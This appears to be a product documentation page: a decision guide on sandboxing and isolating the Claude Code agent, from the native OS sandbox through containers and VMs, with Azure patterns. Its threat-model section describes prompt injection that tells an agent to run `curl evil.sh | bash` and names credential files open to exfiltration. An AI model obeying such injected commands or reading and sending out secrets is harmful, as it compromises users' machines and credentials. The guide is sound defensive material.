<!-- audience: public -->

# Claude Code isolation & sandboxing — a decision guide

> "Do we need a VM to run the coding agents?" is the wrong first question. The
> right one is: *which failure are you containing, and is there a human in the
> loop?* This guide answers it.

A coding agent, by default, has full filesystem access, an arbitrary shell, and
unrestricted network egress. That is fine for solo, interactive use and not
acceptable for enterprise automated workflows. Isolation doesn't make the model
trustworthy — it makes trust *unnecessary* for the blast radius you care about.

## Start from the threat model

The concrete failure modes isolation contains:

- a stray `rm -rf` or a `git reset --hard` that destroys uncommitted work;
- **prompt injection** — a malicious issue body, README, or web page tells the
  agent to `curl evil.sh | bash`;
- **credential exfiltration** — anything readable in the environment
  (`~/.aws/credentials`, a `.env`, a GitHub token) is one `cat` away from
  leaving the machine.

Pick the rung that contains the failure you actually face — not the heaviest
rung available.

## The isolation ladder

| Rung | What it is | Contains | Cost |
| --- | --- | --- | --- |
| **1. Native OS sandbox** | Claude Code's built-in sandbox on OS primitives — Linux **bubblewrap**, macOS **Seatbelt** (Windows runs it under **WSL2**) | filesystem, network, process execution, with zero infrastructure | ~none |
| **2. Dev container** | agent + toolchain + one project in a Docker box with firewall rules (`.devcontainer`) | reproducible env + a cleaner boundary for headless runs | low |
| **3. gVisor / microVM** | application-kernel isolation (what hosted code-execution sandboxes use) | escape-resistant even with root inside | medium |
| **4. Full VM / VDI** | hardware-level isolation, separate kernel | strongest boundary | highest |

The bottom rung already buys most of what people reach for VMs to get. The native
sandbox shipped in late 2025 and, in Anthropic's testing, cut permission prompts
sharply while containing filesystem, network, and process execution. For ordinary
interactive development, **it is the default answer** — a VM just adds latency,
cost, and a worse developer experience.

A dev container (rung 2) is the right home for **unattended** runs: it's the
boundary that makes `--dangerously-skip-permissions` acceptable. But it shares
the host kernel — with that flag, a malicious project can still exfiltrate
anything in the container, so use it only for **trusted** repositories and never
mount secrets.

## Where a VM (rung 3–4) actually earns its place

- **Unattended / autonomous runs.** The moment you drop the human-in-the-loop
  permission gate — overnight refactors, batch jobs, `--dangerously-skip-permissions`
  — you want a **disposable**, strong boundary you can burn after. A microVM or
  ephemeral cloud environment fits; a shared-kernel dev container is weaker here.
- **Untrusted code or multi-tenant infra.** Repos you don't control, or many
  developers pooled on shared hardware — kernel-escape risk pushes you past
  containers to VM-grade isolation.
- **Keeping source and secrets off endpoints.** This is the real enterprise
  driver, and it's a **data-governance** decision, not a sandbox one. If the rule
  is "regulated source must never reside on a laptop," a VDI or cloud-VM pattern
  keeps the repo, the agent, and the credentials inside a controlled subnet and
  turns the laptop into a thin client. The agent *strengthens* this argument — it
  reads the whole tree and could leak it — but the requirement comes from your
  data-residency posture, not from the agent.
- **CI/CD.** Your runners are already VMs; headless agent review lives there
  naturally. You're using a VM without calling it one.

**Overkill:** ordinary interactive development with permissions on. The native
sandbox already contains the blast radius.

## Azure / Microsoft patterns

| Pattern | What runs where | Best when |
| --- | --- | --- |
| **AVD / Windows 365 (persistent VDI)** | Agent runs in the cloud desktop; source never lands locally; egress flows through a controlled path | A hard "no regulated source on endpoints" mandate, *and* you already operate VDI. Run the agent **under WSL2** inside the desktop so the native sandbox still applies. |
| **Zero-Trust managed endpoint** (Intune + EDR + ZPA/Zscaler) | Agent runs locally under the native sandbox + managed settings; egress controlled by ZPA; EDR watches the host | The modern default when there's no "no source on endpoints" rule — lightest, fastest, best DX. |
| **Ephemeral cloud dev environment** | Per-task VM/container in the cloud; source cloned into a disposable boundary; laptop is a thin client; torn down after | You want a VM's data-off-endpoint benefit *without* persistent-desktop overhead — and the disposability is what makes unattended runs safe. Usually the sweet spot. |
| **Hosted agent (zero-ops)** | An ephemeral, vendor-hosted sandbox | You want no infrastructure at all; weigh it against seat/feature and data-handling requirements. |

If you want a VM's benefits without VDI's weight, prefer **ephemeral cloud dev
environments** over persistent VDI — unless you already run AVD for other reasons,
in which case run the agent inside it.

## How EmbedIQ maps to each rung

EmbedIQ generates the agent harness; the **isolation posture** question
(admin-only) drives which enforcement artifacts it emits, so the harness
*enforces* the rung you chose rather than just documenting it:

| Posture you pick | EmbedIQ emits |
| --- | --- |
| Managed device / VDI / ephemeral cloud | `deploy/claude-code/managed-settings.json` — requires the native OS sandbox **fleet-wide** (deliver via Intune/Jamf/MDM) + a delivery README |
| Dev container | the above **plus** `.devcontainer/devcontainer.json` (firewall-restricted, language-matched) |
| CI/CD only / none | no enforcement files — the baseline harness |

Across **every** rung, the rest of the generated harness is identical — path-scoped
rules, the DLP / command-guard / egress / audit Python hooks, and the tiered
`settings.json` permission envelope run the same whether the agent sits on a
managed laptop, in a container, in a VM, or in an AVD session. Isolation is the
*boundary*; the harness is the *behavior inside it*. You want both.

## See also

- [Azure isolation runbook](../operator-guide/azure-isolation-runbook.md) — the AVD + WSL2 + Intune + Zero-Trust how-to
- [Healthcare BPO deployment](../HEALTHCARE-BPO-DEPLOYMENT.md)
- [Deployment](../operator-guide/deployment.md) · [Security model](../../SECURITY.md)
